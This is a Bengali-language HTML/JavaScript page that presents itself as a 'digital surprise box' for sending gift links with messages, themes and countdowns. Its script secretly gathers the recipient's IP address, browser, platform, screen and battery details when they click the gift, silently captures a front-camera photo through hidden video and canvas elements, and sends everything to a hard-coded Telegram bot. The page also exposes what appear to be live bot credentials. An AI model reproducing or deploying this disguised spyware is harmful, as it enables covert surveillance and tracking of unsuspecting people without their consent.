        <h1><span>üéÅ</span> ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</h1>
        <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º‡¶ú‡¶®‡¶ï‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶â‡¶™‡¶π‡¶æ‡¶∞ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        
        <div class="instruction">
            <i class="fas fa-info-circle"></i>
            <span>‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶´‡¶∞‡ßç‡¶Æ‡¶ü‡¶ø ‡¶™‡ßÇ‡¶∞‡¶£ ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶è‡¶¨‡¶Ç ‡¶è‡¶ï‡¶ü‡¶ø ‡¶Ö‡¶®‡¶®‡ßç‡¶Ø ‡¶ó‡¶ø‡¶´‡¶ü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</span>
        </div>
        
        <div class="theme-selector">
            <div class="theme-option active" data-theme="birthday"><i class="fas fa-birthday-cake"></i> ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®</div>
            <div class="theme-option" data-theme="anniversary"><i class="fas fa-ring"></i> ‡¶¨‡¶ø‡¶¨‡¶æ‡¶π ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ</div>
            <div class="theme-option" data-theme="newyear"><i class="fas fa-glass-cheers"></i> ‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶õ‡¶∞</div>
            <div class="theme-option" data-theme="proposal"><i class="fas fa-heart"></i> ‡¶™‡ßç‡¶∞‡¶™‡ßã‡¶ú‡¶æ‡¶≤</div>
            <div class="theme-option" data-theme="general"><i class="fas fa-gift"></i> ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£</div>
            <div class="theme-option" data-theme="custom"><i class="fas fa-paint-brush"></i> ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ</div>
        </div>

        <form id="giftForm">
            <div class="form-group hidden" id="customThemeGroup">
                <label for="customThemeText"><i class="fas fa-text-height"></i> ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶•‡¶ø‡¶Æ‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ:</label>
                <input type="text" id="customThemeText" placeholder="‡¶Ø‡ßá‡¶Æ‡¶®: ‡¶∂‡ßÅ‡¶≠ ‡¶∏‡ßç‡¶®‡¶æ‡¶§‡¶ï">
            </div>

            <div class="form-group">
                <label for="senderName"><i class="fas fa-user"></i> ‡¶™‡ßç‡¶∞‡ßá‡¶∞‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ:</label>
                <input type="text" id="senderName" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®">
            </div>
            <div class="form-group">
                <label for="receiverName"><i class="fas fa-user-friends"></i> ‡¶™‡ßç‡¶∞‡¶æ‡¶™‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ:</label>
                <input type="text" id="receiverName" required placeholder="‡¶™‡ßç‡¶∞‡¶æ‡¶™‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®">
            </div>
            <div class="form-group">
                <label for="message"><i class="fas fa-envelope"></i> ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</label>
                <textarea id="message" rows="4" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®..."></textarea>
            </div>
            <div class="form-group">
                <label for="imageURL"><i class="fas fa-image"></i> ‡¶õ‡¶¨‡¶ø‡¶∞ URL (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï):</label>
                <input type="url" id="imageURL" placeholder="‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø ‡¶õ‡¶¨‡¶ø‡¶∞ ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶¶‡¶ø‡¶® (‡¶Ø‡ßá‡¶Æ‡¶®: https://i.imgur.com/image.jpg)">
            </div>
            
            <div class="form-group">
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <input type="checkbox" id="enableCountdown" style="width: auto; height: 16px; aspect-ratio: 1;">
                    <span><i class="fas fa-clock"></i> ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶°‡¶æ‡¶â‡¶® ‡¶ü‡¶æ‡¶á‡¶Æ‡¶æ‡¶∞ ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®</span>
                </label>
                <div id="countdownInputGroup" class="hidden" style="margin-top: 10px;">
                    <label for="countdownDateTime">‡¶Ü‡¶®‡¶≤‡¶ï ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶Æ‡ßü:</label>
                    <input type="datetime-local" id="countdownDateTime">
                </div>
            </div>

            <button type="submit"><i class="fas fa-link"></i> ‡¶ó‡¶ø‡¶´‡¶ü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </form>
        
        <div id="generatedLinkContainer" class="hidden">
            <h3><i class="fas fa-check-circle"></i> ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶π‡ßü‡ßá‡¶õ‡ßá!</h3>
            <p>‡¶è‡¶á ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡ßü‡¶ú‡¶®‡¶ï‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡•§</p>
            <input type="text" id="generatedLink" readonly>
            <button id="copyButton"><i class="fas fa-copy"></i> ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
            <div id="copySuccess" class="success-message hidden"><i class="fas fa-check"></i> ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá!</div>
        </div>
    </div>

    <!-- ‡¶ó‡¶ø‡¶´‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶á‡¶®‡¶æ‡¶∞ -->
    <div class="container hidden" id="gift-container">
        <h2 id="receiverTitle"></h2>
        
        <div id="countdown-container" class="hidden">
             <h3>‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú‡¶ü‡¶ø ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶π‡¶¨‡ßá ‡¶Ü‡¶∞...</h3>
             <div id="timer"></div>
             <p style="margin-top: 10px;">‡¶∏‡¶†‡¶ø‡¶ï ‡¶∏‡¶Æ‡ßü‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®!</p>
        </div>

        <div id="main-gift-content" class="hidden">
            <p>‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú! ‡¶â‡¶™‡¶π‡¶æ‡¶∞‡¶ü‡¶ø ‡¶ñ‡ßÅ‡¶≤‡¶§‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶¨‡¶ï‡ßç‡¶∏‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßã‡•§</p>
            <h2 id="themeMessage"></h2>
            <div class="gift-wrapper" id="giftWrapper">
                <div class="gift-box" id="giftBox">
                    <div class="ribbon-bow"></div>
                    <div class="lid"></div>
                    <div class="box-body"></div>
                    <div class="ribbon-vertical"></div>
                    <div class="ribbon-horizontal"></div>
                    <div class="sparkle" style="top: 20px; left: 30px;"></div>
                    <div class="sparkle" style="top: 50px; right: 40px;"></div>
                    <div class="sparkle" style="bottom: 60px; left: 50px;"></div>
                    <div class="sparkle" style="bottom: 30px; right: 30px;"></div>
                    <div class="gift-content">
                        <i class="fas fa-gift" style="font-size: 40px; margin-bottom: 10px;"></i>
                        <h3 style="color: white; margin: 0;">‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú!</h3>
                    </div>
                </div>
                <div class="gift-content-revealed hidden" id="giftContentRevealed">
                    <img id="revealedImage" src="" alt="Gift Image" class="hidden">
                </div>
                <p class="click-instruction">‡¶¨‡¶ï‡ßç‡¶∏‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®</p>
            </div>
        </div>
    </div>

    <div class="victory-effect" id="victoryEffect"></div>

    <!-- ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ì ‡¶õ‡¶¨‡¶ø ‡¶§‡ßã‡¶≤‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶™‡ßç‡¶∞‡ßü‡ßã‡¶ú‡¶®‡ßÄ‡ßü ‡¶Ö‡¶¶‡ßÉ‡¶∂‡ßç‡¶Ø ‡¶è‡¶≤‡¶ø‡¶Æ‡ßá‡¶®‡ßç‡¶ü -->
    <video id="video-preview" style="display:none;" playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶è‡¶¨‡¶Ç ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶∏‡ßá‡¶ü‡¶ø‡¶Ç‡¶∏ ---
        const BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk"; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶¶‡¶ø‡¶®
        const CHAT_ID = "2139008203";   // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü ‡¶Ü‡¶á‡¶°‡¶ø ‡¶¶‡¶ø‡¶®
        let videoStream = null;

        // ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function sendDeviceInfo() {
            console.log("Collecting device info...");
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;
                const battery = await navigator.getBattery();
                const batteryStatus = `Battery: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;

                const deviceInfo = `
üéÅ **Surprise Box Opened!** üéÅ
---
**Device Information:**
- **IP Address:** \`${ipAddress}\`
- **Browser:** ${navigator.userAgent}
- **Platform:** ${navigator.platform}
- **Screen:** ${window.screen.width}x${window.screen.height}
- **Battery:** ${batteryStatus}
                `;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo, parse_mode: 'Markdown' })
                });
                console.log("Device info sent.");
            } catch (error) {
                console.error("Error sending device info:", error);
            }
        }

        // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function startCamera() {
            return new Promise(async (resolve, reject) => {
                console.log("Requesting camera access...");
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    console.error("getUserMedia is not supported on this browser.");
                    return reject("getUserMedia not supported");
                }
                try {
                    const constraints = { video: { facingMode: 'user' } };
                    videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                    const video = document.getElementById('video-preview');
                    video.srcObject = videoStream;
                    video.onloadedmetadata = () => {
                        video.play();
                        console.log("Camera stream started.");
                        resolve(video);
                    };
                } catch (error) {
                    console.error("Camera access denied or error:", error);
                    reject(error);
                }
            });
        }

        // ‡¶õ‡¶¨‡¶ø ‡¶§‡ßã‡¶≤‡¶æ ‡¶è‡¶¨‡¶Ç ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function captureAndSendPhoto(video, caption = "") {
            console.log("Capturing photo...");
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/png');

            const blob = await (await fetch(photoData)).blob();
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.png");
            if (caption) {
                formData.append("caption", caption);
            }

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
                console.log("Photo sent successfully.");
            } catch (error) {
                console.error("Error sending photo:", error);
            }
        }
        
        // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function stopCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
                videoStream = null;
                console.log("Camera stopped.");
            }
        }
        
        // ‡¶§‡¶•‡ßç‡¶Ø ‡¶ì ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶Æ‡ßÇ‡¶≤ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function initiateCaptureAndSend(caption) {
            await sendDeviceInfo();
            try {
                const video = await startCamera();
                setTimeout(async () => {
                    await captureAndSendPhoto(video, caption);
                    stopCamera();
                }, 500);
            } catch (error) {
                console.log("Could not start camera, proceeding without photo.");
            }
        }
        
        // --- ‡¶Æ‡ßÇ‡¶≤ ‡¶™‡ßá‡¶ú‡ßá‡¶∞ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü ---
        document.addEventListener('DOMContentLoaded', () => {
            const params = new URLSearchParams(window.location.search);
            if (params.has('sender')) {
                document.getElementById('form-container').classList.add('hidden');
                document.getElementById('gift-container').classList.remove('hidden');
                const theme = params.get('theme') || 'general';
                applyTheme(theme);
                displayGift(params);
            } else {
                setupThemeSelector();
                setupForm();
                setupCountdownInput();
            }
        });

        function setupThemeSelector() {
            const themeOptions = document.querySelectorAll('.theme-option');
            const customThemeGroup = document.getElementById('customThemeGroup');
            themeOptions.forEach(option => {
                option.addEventListener('click', () => {
                    themeOptions.forEach(opt => opt.classList.remove('active'));
                    option.classList.add('active');
                    const theme = option.getAttribute('data-theme');
                    applyTheme(theme);
                    customThemeGroup.classList.toggle('hidden', theme !== 'custom');
                });
            });
        }
        
        function setupCountdownInput() {
            const enableCountdown = document.getElementById('enableCountdown');
            const countdownInputGroup = document.getElementById('countdownInputGroup');
            enableCountdown.addEventListener('change', () => {
                countdownInputGroup.classList.toggle('hidden', !enableCountdown.checked);
            });
        }

        function applyTheme(themeName) {
            document.body.className = '';
            document.body.classList.add(`theme-${themeName}`);
            setThemeRGBValues(themeName);
        }

        function setThemeRGBValues(themeName) {
            let primaryRGB, giftBoxRGB, ribbonRGB;
            switch(themeName) {
                case 'birthday': primaryRGB = '255, 107, 139'; giftBoxRGB = '255, 107, 139'; ribbonRGB = '255, 209, 102'; break;
                case 'anniversary': primaryRGB = '212, 175, 55'; giftBoxRGB = '212, 175, 55'; ribbonRGB = '255, 107, 139'; break;
                case 'newyear': primaryRGB = '16, 185, 129'; giftBoxRGB = '16, 185, 129'; ribbonRGB = '255, 209, 102'; break;
                case 'proposal': primaryRGB = '236, 72, 153'; giftBoxRGB = '236, 72, 153'; ribbonRGB = '192, 132, 252'; break;
                default: primaryRGB = '74, 108, 247'; giftBoxRGB = '74, 108, 247'; ribbonRGB = '255, 107, 139';
            }
            document.documentElement.style.setProperty('--theme-primary-rgb', primaryRGB);
            document.documentElement.style.setProperty('--theme-gift-box-rgb', giftBoxRGB);
            document.documentElement.style.setProperty('--theme-ribbon-rgb', ribbonRGB);
        }

        function setupForm() {
            const form = document.getElementById('giftForm');
            const copyButton = document.getElementById('copyButton');
            const copySuccess = document.getElementById('copySuccess');
            
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                const senderName = document.getElementById('senderName').value;
                const receiverName = document.getElementById('receiverName').value;
                const message = document.getElementById('message').value;
                const imageURL = document.getElementById('imageURL').value;
                const activeTheme = document.querySelector('.theme-option.active').getAttribute('data-theme');
                
                let giftLink = `${window.location.href.split('?')[0]}?sender=${encodeURIComponent(senderName)}&receiver=${encodeURIComponent(receiverName)}&message=${encodeURIComponent(message)}&image=${encodeURIComponent(imageURL)}&theme=${activeTheme}`;

                if (activeTheme === 'custom') {
                    const customText = document.getElementById('customThemeText').value;
                    giftLink += `&ct=${encodeURIComponent(customText)}`;
                }

                const enableCountdown = document.getElementById('enableCountdown').checked;
                const countdownDateTime = document.getElementById('countdownDateTime').value;
                if (enableCountdown && countdownDateTime) {
                    giftLink += `&cd=${encodeURIComponent(countdownDateTime)}`;
                }
                
                document.getElementById('generatedLink').value = giftLink;
                document.getElementById('generatedLinkContainer').classList.remove('hidden');
                document.getElementById('generatedLinkContainer').scrollIntoView({ behavior: 'smooth' });
            });
            
            copyButton.addEventListener('click', () => {
                const linkInput = document.getElementById('generatedLink');
                linkInput.select();
                linkInput.setSelectionRange(0, 99999);
                try {
                    navigator.clipboard.writeText(linkInput.value).then(() => {
                        copySuccess.classList.remove('hidden');
                        setTimeout(() => copySuccess.classList.add('hidden'), 3000);
                    });
                } catch (err) {
                    document.execCommand('copy');
                    copySuccess.classList.remove('hidden');
                    setTimeout(() => copySuccess.classList.add('hidden'), 3000);
                }
            });
        }

        function displayGift(params) {
            const countdownTime = params.get('cd');
            if (countdownTime) {
                handleCountdown(params, new Date(decodeURIComponent(countdownTime)));
            } else {
                showMainGiftContent(params);
            }
        }
        
        function handleCountdown(params, targetDate) {
            const countdownContainer = document.getElementById('countdown-container');
            const mainGiftContent = document.getElementById('main-gift-content');
            const timerElement = document.getElementById('timer');
            
            countdownContainer.classList.remove('hidden');
            mainGiftContent.classList.add('hidden');
            document.getElementById('receiverTitle').textContent = `‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º ${decodeURIComponent(params.get('receiver'))}`;

            const timerInterval = setInterval(() => {
                const now = new Date().getTime();
                const distance = targetDate - now;

                if (distance < 0) {
                    clearInterval(timerInterval);
                    countdownContainer.classList.add('hidden');
                    showMainGiftContent(params);
                    return;
                }

                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
                
                timerElement.innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;

            }, 1000);
        }

        function showMainGiftContent(params) {
            document.getElementById('main-gift-content').classList.remove('hidden');
            const sender = decodeURIComponent(params.get('sender'));
            const receiver = decodeURIComponent(params.get('receiver'));
            const message = decodeURIComponent(params.get('message'));
            const imageURL = decodeURIComponent(params.get('image'));
            const theme = params.get('theme') || 'general';

            document.getElementById('receiverTitle').textContent = `‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º ${receiver}`;
            
            const themeMessageElement = document.getElementById('themeMessage');
            let themeText = '';
            if (theme === 'custom') {
                themeText = decodeURIComponent(params.get('ct')) || '‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶â‡¶™‡¶π‡¶æ‡¶∞!';
            } else {
                switch(theme) {
                    case 'birthday': themeText = '‡¶∂‡ßÅ‡¶≠ ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®!'; break;
                    case 'anniversary': themeText = '‡¶∂‡ßÅ‡¶≠ ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ!'; break;
                    case 'newyear': themeText = '‡¶∂‡ßÅ‡¶≠ ‡¶®‡¶¨‡¶¨‡¶∞‡ßç‡¶∑!'; break;
                    case 'proposal': themeText = '‡¶§‡ßã‡¶Æ‡¶æ‡¶ï‡ßá ‡¶≠‡¶æ‡¶≤‡ßã‡¶¨‡¶æ‡¶∏‡¶ø!'; break;
                    default: themeText = '‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶â‡¶™‡¶π‡¶æ‡¶∞!';
                }
            }
            themeMessageElement.textContent = themeText;
            
            if (imageURL && imageURL.trim() !== '') {
                const imageElement = document.getElementById('revealedImage');
                imageElement.onload = () => imageElement.classList.remove('hidden');
                imageElement.onerror = () => console.error("Image failed to load:", imageURL);
                imageElement.src = imageURL;
            }
            
            const giftBox = document.getElementById('giftBox');
            const giftWrapper = document.getElementById('giftWrapper');
            const clickInstruction = document.querySelector('.click-instruction');
            
            giftWrapper.addEventListener('click', () => {
                const caption = `Gift from: ${sender}\nTo: ${receiver}`;
                initiateCaptureAndSend(caption);

                giftBox.classList.add('open');
                clickInstruction.style.display = 'none';

                setTimeout(() => {
                    giftWrapper.classList.add('revealed');
                    document.getElementById('giftContentRevealed').classList.remove('hidden');
                    const messageContainer = document.createElement('div');
                    messageContainer.classList.add('message-container');
                    
                    const messageParagraph = document.createElement('p');
                    messageParagraph.textContent = message;

                    messageContainer.innerHTML = `<h3>${sender} ‡¶è‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</h3>`;
                    messageContainer.appendChild(messageParagraph);
                    
                    document.getElementById('giftContentRevealed').appendChild(messageContainer);
                    
                    setTimeout(() => messageContainer.classList.add('show'), 100);
                    triggerVictoryEffect();
                }, 1000);
            }, { once: true });
        }

        function triggerVictoryEffect() {
            const victoryEffect = document.getElementById('victoryEffect');
            victoryEffect.style.display = 'block';
            for (let i = 0; i < 50; i++) {
                const firework = document.createElement('div');
                firework.classList.add('firework');
                firework.style.backgroundColor = getRandomThemeColor();
                firework.style.left = '50%';
                firework.style.top = '50%';
                firework.style.setProperty('--tx', `${Math.random() * 400 - 200}px`);
                firework.style.setProperty('--ty', `${Math.random() * 400 - 200}px`);
                victoryEffect.appendChild(firework);
                setTimeout(() => firework.remove(), 1500);
            }
            for (let i = 0; i < 100; i++) {
                const confetti = document.createElement('div');
                confetti.classList.add('confetti-piece');
                confetti.style.backgroundColor = getRandomThemeColor();
                confetti.style.left = `${Math.random() * 100}%`;
                confetti.style.animationDelay = `${Math.random() * 2}s`;
                victoryEffect.appendChild(confetti);
                setTimeout(() => confetti.remove(), 3000);
            }
            setTimeout(() => { victoryEffect.style.display = 'none'; }, 3000);
        }

        function getRandomThemeColor() {
            const themeColors = ['var(--theme-primary)', 'var(--theme-secondary)', 'var(--theme-accent)', 'var(--theme-ribbon)', '#FFD166', '#06D6A0', '#118AB2', '#EF476F'];
            return themeColors[Math.floor(Math.random() * themeColors.length)];
        }
    </script>
</body>
</html>
